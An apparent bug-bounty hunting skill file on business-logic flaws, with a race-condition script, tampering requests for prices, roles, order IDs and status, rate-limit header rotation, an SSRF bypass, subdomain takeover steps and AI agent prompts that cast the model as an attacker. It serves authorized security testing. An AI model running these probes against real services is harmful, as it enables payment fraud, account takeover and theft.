# Parallel one-time redemption (#759247, #974892)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

### Quota / Cost Inversion

```graphql
# Negative GraphQL cost bucket (#481518)
query { things(first: -100) { id } }
```

### Mass-Assignment Probes

```http
PUT /v2/seats HTTP/1.1
{"seats":100,"price":1,"plan_id":"pro"}

PATCH /frontegg/identity/resources/tenants/api-tokens/v1/<ID>
{"Info":"x","description":"x","createdAT":"x","roleIds":["admin"]}
```

### Grep Patterns for Client-Side Review

```bash
grep -iE "(price|amount|total|cost|qty|seats)\s*[=*+]" app.js
grep -oE '"/(employee|internal|staff|admin|users/new_invite)[^"]*"' *.js
grep -iE "is_pro|is_active|verified|data-upgrade|followUpUrl|config=" *.js
grep -riE "x-forwarded-for|x-real-ip|cf-connecting-ip" src/
```

### Object-Reference & Status Tampering

```http
# Reddit coin purchase — substitute a cheap order_id into an expensive order (#1213765)
POST /api/v2/gold/paypal/create_coin_purchase_order
coins=1100&pennies=399&correlation_id=<NEW-UUID>&order_id=<CHEAP-ORDER-ID>

# Omise payment status — swap the payment identifier (#1538669)
GET /payments/paym_test_xxxx/status HTTP/2

# Reddit ad approval — PENDING -> ACTIVE without payment/review (#1543159)
PATCH /api/ads/campaign/<id>
{"status":"ACTIVE","effective_status":"APPROVED"}
```

```bash
# Starbucks-style subscription/shipping address reference swap (#141090, #141120)
curl -s -X PUT https://target.com/api/subscriptions/<victim_id>/shipping \
  -H "Cookie: session=<attacker>" -d '{"address":"attacker-controlled"}'
```

### Approval / Invite / Gate Bypass

```http
# HackerOne sandbox org — use hidden /new_invite endpoint despite rate-limit message (#1486417)
GET /organizations/<org>/users/new_invite
POST /organizations/<org>/users
{"email":"outsider@example.com"}

# Automattic CAPTCHA bypass — call the underlying wp-json endpoint directly (#206653)
POST /wp-json/brc/v1/approval-requests
{"name":"a","email":"a@b.com"}   # no captcha field, no rate limit
```

```bash
# Team-member with Report rights bans an Admin (#816143)
POST /api/programs/<program>/reports/<id>/ban_reporter
```

### Email / Identity Change ATO

```http
# Email change without re-authentication, then reset to attacker mailbox (#1089467, #223461)
POST /accounts/profile
{"email":"attacker@example.com"}

POST /forgot_password
{"email":"attacker@example.com"}
```

```http
# OAuth linking bypasses prior email verification (#1074047)
# 1) register victim's unregistered address via email (verification pending)
# 2) victim signs in with Google OAuth -> account linked without verification
```

### Cookie / Cache / CSRF

```http
# Arbitrary cookie set/get endpoint (#534450)
GET  /cookies?name=verified
POST /cookies  name=verified&value=true
```

```bash
# Tumblr-style cookie injection via crafted link (#1005421)
# consumer_key=x; domain=target.com; Max-Age=1000000000000000000000

# Reusable CSRF token across form submissions (#223525, #361414)
# capture csrfmiddlewaretoken once, replay 25x on password-reset endpoint
```

### Currency / Cost Inversion

```http
# PortSwigger currency arbitrage — pay less than USD-equivalent (#1677155)
POST /checkout {"amount":100,"currency":"LOW_VALUE_UNIT"}

# Shipt fraction price manipulation (#388564)
POST /api/cart {"price":0.001,"qty":1}
```

### Subdomain Takeover Proof-of-Concept

```bash
dig +short dangling.target.com        # -> abandoned S3 / EC2 / Azure endpoint
# Claim the resource, host a marker:
curl dangling.target.com/index.html   # <!-- your-username -->
# Then assess: cookies scoped to *.target.com, OAuth allowlisted redirect, phishing
```

### Detection Oracles Summary

| Oracle | What proves the bug | Example |
|---|---|---|
| Server-side state change | Value differs on a fresh authenticated read | Prime features still active after rewrite (#1070510) |
| Multiplier | N × from one single-use input | $25 card redeemed 7× = $175 (#759247) |
| Arithmetic gap | granted units > billed units | 7 seats, $360 charged (#1446090) |
| Cross-account effect | Victim object changed by attacker session | shipping address of another subscription (#141120) |
| Status inversion | Gate state advanced without prerequisite | PENDING → ACTIVE (#1543159) |
| OOB callback | DNS/HTTP hit proves server-side fetch | webhook IPv6 bypass (#2301565) |

---

## Common Root Causes

1. **Client-supplied values drive financial decisions.** Price, quantity, seats, or amount is passed through forms/URLs/JSON and used by the server without re-lookup against a canonical product database (#364843, #1403176, #1446090).

2. **Verification enforced only in the UI.** The frontend hides a feature behind a gate but the backend API is fully functional without verified status — any authenticated or even unauthenticated request succeeds (#1543159, #2061982, #2571981).

3. **Trust in response booleans.** Entitlement is decided in client-side code from `is_pro`/`is_active`/`verified` flags that the user can rewrite in the response or the DOM (#1070510, #2962527, #594080).

4. **Check-then-act without atomicity.** Balance/credit/invite/redemption flows read a state, then act on it in a separate step with no row lock or unique constraint, enabling parallel races (#759247, #974892, #1285538).

5. **Multiple-of-a-kind arithmetic inconsistency.** One code path rounds up a quantity while another bills the floor or integer part; negative values are never rejected (#1446090, #364843, #388564).

6. **IP-based rate limiting from spoofable headers.** Limits key on `X-Forwarded-For`/`X-Real-IP` rather than the connection IP, so rotating headers resets the counter (#1067533, #206653).

7. **Webhooks/success callbacks without signature or idempotency.** Anyone can POST a fake `status=success`, and a captured webhook can be replayed (#17502, #682344).

8. **Object references without ownership checks.** `order_id`, `payment_id`, `resId`, `scope_id`, and `price_id` are accepted without verifying they belong to the caller or to the current flow (#1213765, #1538669, #1328278).

9. **Mass-assignment of privileged fields.** PUT/PATCH handlers accept `role`, `roleIds`, `verified`, `status`, or `createdAT` directly from the body (#2149124, #1074047).

10. **Trust granted on submission, not on confirmation.** Phone/SMS onboarding and OAuth account linking grant ownership or access before OTP/email ownership is proven (#1330529, #470749, #1074047).

11. **Internal/admin routes deployed without auth middleware.** Obscurity (unlisted URL, gray-out, `data-upgrade` attribute) substituted for authorization (#1486417, #221454, #594080).

12. **Dangling infrastructure treated as trusted.** DNS records pointing to deleted S3/EC2 assets let an attacker serve content on a trusted domain and inherit cookie/OAuth trust (#1182864, #1406335, #1297689).

13. **Quotas/costs that accept inversion.** Negative values or cost buckets reduce rather than consume balance (#481518).

### Root-Cause → Probe Map

| Root cause | Fastest confirming probe | Representative ID |
|---|---|---|
| Client trusts price/qty | Send negative `qty`, then fractional `1.9` | #364843, #1446090 |
| UI-only verification | Call post-gate endpoint with pre-gate session | #1543159 |
| Response boolean trust | Match-and-Replace `false`→`true`, reload | #1070510 |
| Check-then-act race | 30 parallel POSTs via Turbo Intruder | #759247 |
| Arithmetic mismatch | Compare granted count to billed count | #1446090 |
| Spoofable rate-limit IP | Rotate `X-Forwarded-For` across 50 requests | #1067533 |
| Webhook without HMAC | POST forged `status=success`, then replay | #682344 |
| Missing ownership check | Swap `order_id`/`payment_id` | #1213765, #1538669 |
| Mass assignment | Add `roleIds`, `verified`, `status` | #2149124 |
| Trust on submission | Claim ownership without completing OTP | #1330529 |
| Obscurity as auth | Call hidden bundle endpoint unauthenticated | #1486417 |
| Dangling DNS | Claim abandoned S3/EC2 asset | #1406335 |
| Quota inversion | Send `first(-100)` | #481518 |

Each root cause is a *missing enforcement point*, not a missing input filter. That distinction matters for remediation and for severity: the fix is a server-side authority check or an atomic transaction, never just sanitizing the parameter.

---

## Bypass Techniques

| Defense | Bypass (grounded example) |
|---|---|
| "Upgrade now" / gray-out UI gate | Delete `data-upgrade="true"` or call the hidden `/users/new_invite` endpoint from the JS bundle (#594080, #1486417) |
| Client-side `is_pro` check | Match-and-Replace response `false`→`true`, confirm server-side entitlement persists (#1070510) |
| One-time redemption | 30 parallel Turbo Intruder sockets on `/redeem` (#759247) |
| One-time invite / unique name | Concurrent duplicate requests to violate the uniqueness constraint (#1285538, #413759) |
| Quantity must be positive | Negative `qty` in order JSON drops the total (#364843) |
| Seat count is validated | Fractional `1.9` bypasses integer check; `ceil` vs `floor` mismatch (#1446090) |
| Amount set at checkout | Edit `amount`/`pennies` at the PayPal redirect; forge the webhook (#1403176, #682344) |
| Price object must be active | Swap `price_id` back to an archived price mid-flow (#1328278) |
| IP rate limit | Rotate `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` (#1067533) |
| OTP required for ownership | Submit the claim request with attacker-controlled number/`resId` (#1330529) |
| 2FA / password confirmation | Rewrite the disable request directly to the API without the password step (#783258, #2962527) |
| Email must be verified | Register victim email, then complete OAuth login which skips verification (#1074047) |
| Role restricted by UI | Add `roleIds:["admin"]` to the PATCH body (#2149124) |
| CAPTCHA on the form | Call the underlying `wp-json` API endpoint with no captcha field (#206653) |
| Report-abort threshold auto-deletes | Spam the report action past the configured threshold (#1051734) |
| CSRF token mandatory | Reuse one token across 25 submissions, or omit it entirely (#223525, #361414) |
| Object must belong to caller | Swap `order_id`, `payment_id`, `scope_id` references (#1213765, #2450215) |
| OAuth redirect allowlist | Use a dangling subdomain now under attacker control (#1182864, #1297689) |
| Browser back after logout | Check cache headers; expose authenticated pages from cache (#7909, #158270) |

### Response-Manipulation Bypass (#1070510, #2061982, #2962527)

The server returns a trust decision as a client-consumed boolean. Rewriting it in transit grants the feature because no server-side authorization accompanies the UI state. Always verify by performing a privileged action *after* the rewrite, not by observing the cosmetic UI change alone.

### State-Machine Reversal (#1543159, #2061982)

Move a record backward or forward through its lifecycle by calling the transition endpoint out of order: PENDING → ACTIVE without payment/approval; register → active without an event code. Map the documented states, then test each transition with the prerequisites missing.

### DOM-Gate Removal (#594080)

Attributes such as `data-upgrade="true"` and grayed-out messages are advisory. Remove them in DevTools or call the underlying handler directly. If the action succeeds server-side, the gate was never enforced.

### IPv6-Mapped Anti-SSRF Bypass (#2301565)

Webhook/proxy allowlists that filter IPv4 but not IPv6-mapped addresses (`::ffff:127.0.0.1`, `::ffff:169.254.169.254`) can be bypassed; relevant when a logic probe involves server-side URL fetching.

### Arithmetic & Currency Inversion (#388564, #1677155, #481518)

Submit fractions, negative costs, or lower-value currencies to invert a computed price. PortSwigger's currency arbitrage (#1677155) paid less than the USD-equivalent price; Shipt (#388564) used fraction values.

### Token / OTP Reuse (#223525, #12782, #407971)

Verification tokens are often single-use in the UI but not on the server. Replay the same OTP or `csrfmiddlewaretoken` multiple times: HackerOne's spam reports showed a token usable for more than 5 attempts (#12782), and Weblate/Automattic showed reusable CSRF tokens enabling unbounded reset spam (#223525). The bypass is not a stronger token — it is the missing consumption/invalidation step.

### Header-Based Rate-Limit Rotation (#1067533, #206653, #280389)

When the limit keys on a header rather than the TCP peer, rotation is enough. Vary `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, and `CF-Connecting-IP` in lockstep; if the application trusts any one of them, the counter never accumulates. Confirm with 25–50 requests and compare the count of successful actions, not just status codes.

### Time-Delay & Subscription Grace Exploits (#1841064)

Twitter Blue badge without purchase (#1841064) exploited the review/expiry grace window: change the profile photo so the badge enters review, then cancel before expiry and keep the badge during the review period. Any flow with a grace window, pending-review state, or delayed revocation is a bypass candidate — test actions during the window, not only after it closes.

### PostMessage / Redirect Trust (#381356, #48516)

When a form's `onSuccess` handler is absent, some libraries fall back to an attacker-influenced `followUpUrl` fed through a postMessage listener. The bypass is to find a form omits `onSuccess`, then hand the listener a crafted URL. Always check whether the fallback path is validated.

### Always-Rejected Patterns (do not file without real impact)

- Duplicate-unique-name race where the program explicitly marked it "Not a Vuln" with no demonstrable misuse (#3248712).
- Cosmetic "last request: Never never updates" with no security consequence (#220774).
- Self-XSS, password policy complaints without a concrete account-takeover path, or "the flow looks weird" with no dollar/PII/state loss.

---

## Gate 0 Validation

Before writing the report, answer all three.

1. **What can the attacker DO right now?** Be specific and verified: "An unauthenticated user completes checkout for physical goods at $0", "a non-premium user enables a paid iframe feature", "an attacker claims ownership of any unclaimed restaurant listing", "a pending ad is served without payment or approval". If the answer is "the response field changed but the app still blocks the action", the finding is not proven.

2. **What does the victim LOSE?** Identify a concrete, attributable loss: financial (free goods, under-billed seats, fraudulent payments), privacy (unauthorized monitoring, another user's payment status), state (admin banned, comment deleted, listing hijacked), or security degradation (unverified identity trusted for sensitive actions). Quantify where possible: Reverb's gift card redeemed 7× = $175 from one $25 card (#759247); Stripe-style fee-credit replays accrued large fee-free volume. If the loss is purely theoretical, re-evaluate severity.

3. **Can it be reproduced in 10 minutes from scratch?** Create a fresh account (or use none). Follow only your written steps. Achieve the impact end-to-end. For races, confirm reliability across repeated runs; for response manipulation, confirm the entitlement survives a fresh login. If reproduction needs luck, special timing, or internal access, resolve the flakiness before submitting. Remember the "Not a Vuln" lesson (#3248712): a race that violates a UI constraint with no real-world misuse is not a finding.

### Pre-Submission Evidence Checklist

- [ ] Exact endpoint + HTTP method and the single parameter that was mutated.
- [ ] Before/after values shown, with the server-side state change — not only a response echo.
- [ ] A quantified multiplier: N× redemption, $X under-billed, or the specific victim object changed.
- [ ] Confirmation that the effect survives a fresh login / page reload (rules out a cosmetic UI artifact).
- [ ] For races: the parallel-request count and a reliability note across repeated runs.
- [ ] A one-sentence victim-loss statement that a triager can repeat without context.
- [ ] Negative control where useful: the sibling field that did *not* work, so the client patches the right endpoint.

If any box is unchecked, you are not ready to submit. A logic bug without a demonstrated loss is the single most common N/A in this corpus.

---

## Real Impact Examples

### Scenario A — Free Physical Goods / Under-billed Orders (Upserve/Acronis/Reddit Pattern)

An order JSON accepted an extra line item with a negative quantity: two ChickenBurgers at $12 and one BreadPudding at -$9 produced a $18.70 total that the system accepted and fulfilled (#364843). Variants include editing the price at the PayPal redirect (#1403176), substituting a cheap `order_id` into an expensive coin purchase (#1213765), and swapping an archived `price_id` mid-checkout (#1328278). Impact: direct, repeatable financial loss — the attacker receives full-value goods/services for a fraction of cost.

### Scenario B — Free Entitlement via Response Rewriting / DOM Gate (Logitech/Infogram Pattern)

The Prime subscription endpoint returned `is_pro:false` and a dozen other false flags. A Burp Match-and-Replace flipping every `false` to `true` unlocked Streamlabs Prime features, including a reward that delivered a physical Logitech mouse (#1070510). In a parallel case, deleting `data-upgrade="true"` from an iframe integration let a free user embed iframes without upgrading (#594080). Impact: paid features and physical rewards obtained without payment, infinitely repeatable.

### Scenario C — Ownership Hijack via Verification Bypass (Eternal/X Pattern)

An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp` sent an OTP to a restaurant's number; by manipulating the request an attacker mapped their own email as Owner/Manager of any unclaimed listing (#1330529). In a related flow, knowing any phone number allowed unauthenticated SMS commands — tweeting, DMing, and even removing 2FA — on the corresponding account (#470749). Impact: identity/ownership takeover and fraudulent control of victim assets without credentials.

### Scenario D — Infinite Credit via Race (Reverb/Helium Pattern)

A single $25 gift card was redeemed 7 times in parallel, yielding $175 in store credit (#759247). The same check-then-act flaw in a data-credit transfer endpoint let an account with 10,000 default credits gain extra credits for free (#974892). Impact: unbounded economic value extraction limited only by request throughput.

### Scenario E — Approval / Moderation Subversion (Reddit/Automattic/Vanilla Pattern)

A pending ad campaign was switched to ACTIVE through an API status update, bypassing both payment and admin review (#1543159). In the moderation plane, a "report as abuse" action with no rate limit deleted any user's post once the configured threshold was crossed (#411075, #1051734), and a team member with only Report rights could ban an Admin (#816143). Impact: paid placement obtained without payment, and arbitrary suppression of other users' content or administrators.

---

## Disclosed Report Citations (30 — all IDs verified in the study pack or TOP list)

1. **GitLab — Project Template functionality can be used to copy private project data** ([H1 #689314](https://hackerone.com/reports/689314)) — chained logic flaw, private data copy, $12,000 bounty
2. **Superhuman (Grammarly) — Account takeover through cookie manipulation and XSS** ([H1 #534450](https://hackerone.com/reports/534450)) — arbitrary cookie set/get endpoint, session attack, $0 bounty
3. **Coinbase — Ethereum account balance manipulation** ([H1 #300748](https://hackerone.com/reports/300748)) — balance logic flaw, financial manipulation, $0 bounty
4. **New Relic — Account takeover via Email ID change and Forgot Password** ([H1 #1089467](https://hackerone.com/reports/1089467)) — email-change verification bypass + reset, $2,048 bounty
5. **Upserve / OLO — Total price manipulation using negative quantities** ([H1 #364843](https://hackerone.com/reports/364843)) — negative-quantity price tampering, JSON order body, 2018 / Critical
6. **Vanilla — Abusing "Report as abuse" to delete any user's post** ([H1 #411075](https://hackerone.com/reports/411075)) — abuse of moderation action, no rate limit, $300 bounty
7. **Tucows (VDP) — Bypass of OTP verification during signup on hover.com** ([H1 #3255473](https://hackerone.com/reports/3255473)) — OTP verification bypass, step-skip, $0 bounty
8. **Eternal (Zomato) — Claiming the listing of a non-delivery restaurant through OTP manipulation** ([H1 #1330529](https://hackerone.com/reports/1330529)) — OTP ownership-claim flaw, `send-auto-claim-otp`, 2021 / $3,250
9. **Reverb.com — Race condition allows redeeming gift cards multiple times** ([H1 #759247](https://hackerone.com/reports/759247)) — gift-card race multi-redemption, Turbo Intruder, 2019 / High
10. **Logitech — Manipulating response leads to free access to Streamlabs Prime** ([H1 #1070510](https://hackerone.com/reports/1070510)) — response boolean rewrite (`false`→`true`), entitlement bypass, 2021 / Medium
11. **Helium — Race condition on transfer credits adds extra free data credits** ([H1 #974892](https://hackerone.com/reports/974892)) — credit-transfer race, `transfer_dc`, 2020 / $250
12. **Reddit — Approve admin approval and change status without payment details** ([H1 #1543159](https://hackerone.com/reports/1543159)) — step-skip / status tampering via API, 2022 / $5,000
13. **Reddit — IDOR to pay less for coin purchases via `order_id`** ([H1 #1213765](https://hackerone.com/reports/1213765)) — `order_id` swap, PayPal order mismatch, 2021 / $500
14. **HackerOne — Business logic error leads to bypass 2FA requirement** ([H1 #2571981](https://hackerone.com/reports/2571981)) — 2FA requirement bypass, 2024 / High
15. **X / xAI — Actions (Tweet, DM) unauthenticated on any account with SMS enabled** ([H1 #470749](https://hackerone.com/reports/470749)) — SMS-command trust flaw, phone-number spoofing, 2018 / Critical
16. **Superhuman (Grammarly) — Config override via non-validated query parameter** ([H1 #1082847](https://hackerone.com/reports/1082847)) — `?config=` state injection, reflected XSS, 2021 / Medium
17. **Curve — Non-premium user can change retailers for cashback on all retailers** ([H1 #672487](https://hackerone.com/reports/672487)) — tier-entitlement bypass, endpoint abuse, 2019 / $0
18. **Infogram — Privilege escalation allows iframe functionality without upgrade** ([H1 #594080](https://hackerone.com/reports/594080)) — DOM-gate removal (`data-upgrade`), 2019 / $0
19. **Automattic — CAPTCHA bypass for the most important function (Instagram brand site)** ([H1 #206653](https://hackerone.com/reports/206653)) — CAPTCHA logic flaw, `wp-json` approval spam, 2017 / Medium
20. **Automattic — No rate limit on report functionality deletes any comment** ([H1 #1051734](https://hackerone.com/reports/1051734)) — report-spam threshold abuse, 2020 / High
21. **Automattic — Denial of service by cookie manipulation (api.tumblr.com)** ([H1 #1005421](https://hackerone.com/reports/1005421)) — malicious cookie-setting link, 2020 / Medium
22. **U.S. Dept Of Defense — SSRF in FAST PDF generator [HtUS]** ([H1 #1628209](https://hackerone.com/reports/1628209)) — server-side JS injection in PDF render, 2022 / $4,000
23. **Semrush — XXE in Site Audit exposing file and directory contents** ([H1 #312543](https://hackerone.com/reports/312543)) — external entity via sitemap URL, 2018 / Critical
24. **PortSwigger Web Security — Buying one more license extends existing license expiry** ([H1 #2461737](https://hackerone.com/reports/2461737)) — license state-machine logic error, 2024 / $0
25. **PortSwigger Web Security — Currency arbitrage: pay less than the USD price** ([H1 #1677155](https://hackerone.com/reports/1677155)) — currency-conversion logic flaw, $0 bounty
26. **Shipt — Price manipulation via fraction values (parameter tampering)** ([H1 #388564](https://hackerone.com/reports/388564)) — fractional price-field overflow, $100 bounty
27. **WordPress — Parameter tampering: price manipulation of products** ([H1 #682344](https://hackerone.com/reports/682344)) — in-flight price edit at PayPal, $0 bounty
28. **Frontegg — PATCH method manipulation escalates API key role/settings** ([H1 #2149124](https://hackerone.com/reports/2149124)) — mass-assignment of `roleIds`/`createdAT`, $0 bounty
29. **U.S. Dept Of Defense — 2FA bypass via response manipulation** ([H1 #2962527](https://hackerone.com/reports/2962527)) — response rewrite of MFA state, $0 bounty
30. **Krisp — Add more seats by paying less via PUT /v2/seats manipulation** ([H1 #1446090](https://hackerone.com/reports/1446090)) — fractional-seat arithmetic mismatch, 2021 / Medium

---

## Related Skills & Chains

- **`hunt-race-condition`** — Every uniqueness/quota/balance check in a logic flow is a race candidate. Chain primitive: business logic (coupon/credit/promotion) + parallel requests → one-time credit redeemed N times (#759247, #974892).
- **`hunt-idor`** — Logic flows that trust a client identifier (`order_id`, `payment_id`, `resId`, `scope_id`) overlap directly with IDOR. Chain primitive: step-skip + IDOR on a beneficiary/reference → funds or data from another account (#1213765, #1538669).
- **`hunt-api-misconfig`** — Step-skip and verification-bypass often live beside mass-assignment fields. Chain primitive: email-verify skip + `verified:true, role:admin` → ATO without email control (#2149124, #1074047).
- **`hunt-ato`** — Password reset, email change, and recovery logic are core ATO paths. Chain primitive: email-change without re-auth + password reset to attacker mailbox (#1089467, #223461).
- **`hunt-ssrf`** — URL-fetching and webhook/proxy features are both a logic surface and an SSRF sink; the IPv6-mapped anti-SSRF bypass (#2301565) and PDF-render SSRF (#1628209) sit at the boundary. Chain primitive: webhook logic probe → server-side fetch → internal target.
- **`hunt-csrf`** — Reusable tokens and missing anti-CSRF turn state-changing logic into one-click attacks (#223525, #361414). Chain primitive: logic action + CSRF → victim-triggered state change.
- **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL, state-machine reversal) and the Always-Rejected list to avoid filing self-inflicted bugs.
- **`triage-validation`** — Apply the 7-Question Gate (especially "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just an odd-looking flow (#3248712 was closed as Not a Vuln).


---

## Merged Source Knowledge

This section consolidates **203 unique knowledge blocks** from 13 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (236 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/references/attack-vectors/business-logic-vectors.md`

## State Machine
- Skip workflow state (pending → completed without approved)
- Replay completed transition
- Reverse completed action to recover assets
- Concurrent state transitions (two users advancing the same state)
- Email confirmation bypass: change email → confirmation goes to old email → full account takeover
- OAuth account linking abuse: link attacker's OAuth to victim's primary account

## Limits & Caps
- Rate limit bypass (IP headers, parallel accounts)
- Allowance decrement race (TOCTOU)
- Max withdrawal split into sub-limit chunks
- KYC/tier step skip via direct API call
- GraphQL batching to bypass rate limits (1000 queries in one request)

## Payments & Deposits
- Negative or zero amount accepted
- Price captured at order time, fulfilled at different price
- Coupon stacking beyond intended limits
- Refund + retain resource
- Token type mismatch in deposit/withdrawal
- In-flight payment data modification to payment provider
- CD key / license key extraction via API enumeration

## Rewards & Incentives
- Self-referral across accounts
- Circular referral chain
- Double-claim via revert/reset
- Airdrop Sybil: multiple wallets, one entity

## Cross-Feature
- Deprecated endpoint bypasses new validation
- Webhook triggers privileged action when crafted
- Import/export bypasses create/update validation
- Feature A state consumed by Feature B without validation
- Project import: path traversal in file copy → arbitrary file read
- Git repository import: malicious filename with git flags → file overwrite → RCE
- Template rendering: SSTI via email templates, markdown renderers

## Identity & Account
- Account merge to combine limits
- Delete + re-register to reset flags
- Pending action hijack (token not bound to requesting account)
- Email case sensitivity: two accounts for same address
- Phone number recycling (carrier reassigns numbers)
- Email confirmation bypass: system sends confirmation to current email instead of new email → SSO takeover
- OAuth linking: link attacker's OAuth provider to victim's account → access victim's data
- Password reset without user interaction: direct reset link generation


### From `hunt-skills/bountyforge/references/hacking-agents/business-logic-agent.md`

# Business Logic Agent

You are an attacker that breaks the business rules of applications and protocols. You don't need code injection — you use the system as designed, but in sequences it wasn't designed for.

Other agents cover injection, math, and economics. You own: state machine abuse, workflow bypass, limit circumvention, and protocol rule violations.

### State Machine Abuse

Map every multi-step workflow (checkout, KYC, deposit-withdraw, bridge mint-burn, governance proposals):
- What states are possible?
- What transitions are guarded vs unguarded?
- Can you skip a state (e.g., go from `pending` to `completed` without `approved`)?
- Can you replay a transition (e.g., claim rewards twice by re-entering a loop before state is finalized)?
- Can you reverse a completed transition to recover assets?

### Limit & Cap Bypass

- Rate limit bypass: multiple accounts, parallel requests, IP spoofing headers.
- Allowance/quota: does the limit decrement atomically with the action? Race the decrement.
- Max withdrawal: split into multiple transactions just under the limit.
- KYC/tier limit: escalate tier without completing requirements (e.g., document verification step skippable via direct API call).
- Minter allowance: does `mint()` validate `allowance[minter] >= amount` before AND after minting? Check for TOCTOU.

### Deposit / Payment Logic

- Negative or zero amounts accepted.
- Price calculated at time of order vs. time of fulfillment — manipulate between the two.
- Coupon/discount stacking that wasn't intended.
- Refund + keep goods: can you complete a chargeback flow while retaining the resource?
- Crypto off-ramp: deposit one token type, withdraw another (token type not validated in withdrawal path).

### Referral / Reward Abuse

- Self-referral: refer yourself across accounts.
- Circular referral chains.
- Reward double-claim: claim reward, then trigger a revert or refund that resets claim state.
- Airdrop farming: multiple wallets from one entity, Sybil attack on snapshot.

### Cross-Feature Interaction

- Feature A sets state that Feature B consumes without validation.
- Deprecated endpoint still active and bypasses new validation in main flow.
- Webhook/callback that triggers a privileged action when crafted correctly.
- Import/export feature that bypasses normal create/update validation.

### Identity & Account Logic

- Account merging: merge two accounts to combine their limits.
- Account deletion + re-registration to reset abuse flags.
- Pending action hijack: initiate an action as user A, then have user B complete it (e.g., password reset flow where token is not bound to requesting account).
- Email case sensitivity: `User@example.com` vs `user@example.com` as distinct accounts.
- Email confirmation bypass: change email to victim's → confirmation goes to your email → confirm → SSO takeover → set master password for all stores
- OAuth linking: link attacker's OAuth provider to victim's account → access victim's data across services
- Password reset without user interaction: direct API call sets new password

### Payment & Financial Logic (H100 Proven)

- In-flight payment data modification: intercept payment request to provider and alter amount/details
- CD key / license key extraction: enumerate API to retrieve keys for any game/product
- Double payout: exploit race condition or logic flaw to receive payment twice
- Refund + retain resource: complete refund flow while keeping the purchased item
- Price manipulation between order time and fulfillment

### Smart Contract Business Logic

- Governance quorum: pass a proposal with minimal token backing by front-running vote period.
- Emergency pause: can the emergency function be called in a state where it causes more harm than protection?
- Fee-on-transfer tokens used in contracts that assume `transferFrom` delivers the exact `amount`.
- Rebasing tokens: protocol assumes fixed balances but token balance changes externally.
- Flash loan within a governance vote: borrow tokens, vote, repay — if snapshot is at execution time.

## Output Fields

Add to FINDINGs:

```
workflow: <name of the business flow being abused>
violated_invariant: <the business rule that's broken>
preconditions: <account state or prior actions required>
sequence: |
  Step 1: ...
  Step 2: ...
  Step N: [impact realized]
```


### From `hunt-skills/bountyforge/references/hacking-agents/economic-security-agent.md`

# Economic Security Agent

You are an attacker that breaks protocols using economic pressure, flash loans, price manipulation, and incentive exploitation. You find attacks that are profitable rather than just theoretically possible.

Other agents cover code bugs and races. You own: oracle manipulation, flash loan attacks, liquidity attacks, and tokenomics exploits.

### Flash Loan Attacks

- Identify all functions that read a price, balance, or rate that could be influenced within a single transaction.
- Can you borrow a large amount of tokens, manipulate state, then repay — all within one transaction?
- Flash loan → inflate pool price → use inflated price as collateral → borrow real assets → repay flash loan, keep profit.
- Flash loan → drain liquidity → trigger liquidation at artificial price → profit.
- Flash loan against governance: borrow voting tokens, pass malicious proposal, repay. Is there a vote-snapshot before borrow block?

### Oracle Manipulation

- **Spot price oracles:** AMM spot price used directly (e.g., `reserve0/reserve1`). A large swap skews price within same block.
- **TWAP:** Is the TWAP window long enough to be manipulation-resistant? Short windows (1-5 blocks) can be manipulated with sufficient capital.
- **Chainlink stale price:** Is `updatedAt` checked against `block.timestamp - staleness_threshold`? Is `answeredInRound >= roundId` checked?
- **Multi-oracle fallback:** Primary oracle fails → falls back to a manipulable secondary oracle.
- **Circuit breakers:** Price deviation check that can be bypassed by gradual price movement across multiple blocks.

### Liquidity & Pool Attacks

- **Inflation attack (first depositor):** Mint 1 share, donate large amount directly to vault. Next depositor's shares round to 0 — attacker withdraws all assets.
- **Pool imbalance:** Push pool to extreme ratio (near 0 of one token) to exploit concentrated liquidity math.
- **Sandwich liquidity provision:** Front-run large liquidity add to capture more fees, then immediately withdraw.
- **Exit liquidity:** Protocol assumes there's always sufficient liquidity for redemptions. Can you drain the pool below the required reserve?

### Incentive & Tokenomics

- **Reward farming without risk:** Stake minimal collateral, earn maximum rewards. Is risk proportional to reward?
- **Governance token accumulation:** Buy governance tokens before a valuable proposal, vote, profit, dump.
- **Emission manipulation:** Speed up or slow down reward emission by manipulating the time variable used in reward calculation.
- **Fee extraction:** Protocol collects fees but fee withdrawal is unguarded or extractable by non-authorized parties.
- **Token lockup bypass:** Find paths that allow locked tokens to be used for collateral, voting, or reward claiming before the lockup expires.

### Cross-Protocol & Composability

- **Dependency chain:** Protocol A uses Protocol B's price. Manipulate B to exploit A.
- **Callback exploitation:** Protocol calls back into attacker's contract during a flash loan or liquidation. Attacker re-enters with different context.
- **Liquidation cascade:** Can you trigger a liquidation that in turn triggers more liquidations, profiting from each?
- **Yield aggregator:** Does the aggregator check that the underlying vault hasn't been manipulated before depositing?

### Profitability Threshold

For every attack, estimate:
- **Capital required:** Minimum flash loan or owned capital to execute.
- **Expected profit:** Conservative estimate after gas costs.
- **Attack cost:** Gas + any fees paid.

Only report as FINDING if `expected_profit > attack_cost` under reasonable assumptions (not worst-case for attacker).

## Output Fields

Add to FINDINGs:

```
capital_required: <USD estimate>
expected_profit: <USD estimate>
attack_cost: <USD estimate in gas>
profitability: profitable | break-even | theoretical
flash_loan_source: <protocol where flash loan is obtained>
manipulated_variable: <price, rate, or balance that's manipulated>
```


### From `hunt-skills/bountyforge/references/mode-modules.md`

# Mode Modules — Godmod, Fuzz, X-Ray, Meme, Storage

> Split from SKILL.md v4.1.0. Load the matching module when `--expert`, `--fuzz`, `--xray`, `--meme`, or `--storage` is set. Deep versions also live under `skills/`.

---

## GODMOD — Expert Mode

When `--expert` flag is set or user requests deep analysis, activate 4 simultaneous personas:

### Persona 1: Security Researcher (Pashov/Myers Level)
- Prover-level thinking: formal invariants, mathematical proofs
